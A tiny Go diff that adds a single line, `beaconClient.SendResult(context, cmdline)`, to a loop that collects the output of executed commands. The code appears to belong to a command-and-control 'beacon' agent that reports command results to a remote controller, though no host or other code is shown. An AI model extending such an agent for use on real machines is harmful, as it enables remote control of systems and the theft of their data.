@@ -62,6 +62,7 @@ func main() {
 			cmdline.Out = err.Error()
 		}
 		cmdline.Out += string(arrBytesRes)
+		beaconClient.SendResult(context, cmdline)
 		log.Printf("response: %s", cmdline.Out)
 
 	}
